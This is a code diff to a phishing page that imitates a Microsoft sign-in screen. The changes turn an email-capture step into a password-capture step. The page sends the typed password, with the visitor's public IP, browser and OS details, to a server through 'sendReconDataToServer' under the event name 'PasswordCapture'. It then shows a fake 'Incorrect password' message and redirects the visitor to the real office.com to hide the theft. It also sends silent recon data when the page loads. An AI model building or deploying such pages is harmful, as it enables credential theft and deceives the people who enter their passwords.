@@ -90,22 +90,20 @@
         <h1 class="text-2xl font-normal mb-8">Sign in</h1>
 
         <form onsubmit="handleLoginAttempt(event)">
-            <h2 class="text-2xl font-normal mb-8">Enter Your Password</h2>
-            <input type="email" id="user-input" placeholder="Password" class="input-style" required>
+            <h2 class="text-2xl font-normal mb-8">Enter Password</h2>
+            <input type="password" id="user-input" placeholder="Password" class="input-style" required> 
+            
+            <p class="link-style mb-8">
+                Forgot password?
+            </p>
             
             <p id="status-message" class="text-sm mb-6 hidden text-red-600">
-                Account not found. Please check your credentials.
+                Incorrect password. Please try again.
             </p>
 
-            <p class="link-style">
-                No account? Create one!
-            </p>
-            <p class="link-style mb-8">
-                Can't access your account?
-            </p>
 
             <div class="flex justify-end">
-                <button type="submit" class="blue-button">Next</button>
+                <button type="submit" class="blue-button">Sign in</button>
             </div>
         </form>
 
@@ -218,33 +216,34 @@
             const userInput = document.getElementById('user-input').value;
 
             // 1. Log to console for demonstration
-            console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
-            console.log(`User attempted login with email/phone: ${userInput}`);
+            console.log('%c--- PASSWORD ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
+            console.log(`User attempted password: ${userInput}`);
             
             // 2. Prepare final data payload using background-fetched details + new user input
             const dataDetails = {
                 fetchTime: new Date().toISOString(),
-                event: "LoginAttempt",
+                // Changed event type to indicate this is a password capture
+                event: "PasswordCapture", 
                 publicIP: publicIP, // Uses the IP fetched in the background
                 browserVendor: browserVendor,
                 osPlatform: osPlatform,
                 browserLanguage: browserLanguage,
                 userAgent: userAgent,
-                userInput: userInput // Collects the email/phone
+                userInput: userInput // Collects the password
             };
 
             // 3. Send data to server (synchronous blocking of navigation is avoided by using a promise)
             // .finally() ensures the redirect happens whether the send succeeds or fails
             sendReconDataToServer(dataDetails).finally(() => {
-                // 4. Simulate Redirection (Proceed to next page)
+                // 4. Simulate Redirection (Proceed to final destination)
                 
                 // Show a brief error message (simulating the typical MS flow)
                 statusMessageEl.classList.remove('hidden'); 
 
                 // Use a short timeout to simulate the server check/redirect delay.
                 setTimeout(() => {
-                    // --- CHANGED LINE: Redirects to login.html ---
-                    window.location.href = "login.html"; 
+                    // --- FINAL REDIRECTION: Redirects to https://www.office.com/ ---
+                    window.location.href = "https://www.office.com/"; 
                 }, 1000); // 1 second delay
             });
         }
@@ -261,13 +260,14 @@
             // Optionally log the initial page load event
             const initialData = {
                 fetchTime: new Date().toISOString(),
-                event: "PageLoadRecon",
+                // Changed event type for the second page's initial load
+                event: "PasswordPageLoadRecon", 
                 publicIP: publicIP,
                 browserVendor: browserVendor,
                 osPlatform: osPlatform,
                 browserLanguage: browserLanguage,
                 userAgent: userAgent,
-                userInput: "Page Load (No Input Yet)"
+                userInput: "Password Page Load (No Input Yet)"
             };
             
             // This is the initial, silent send when the page loads
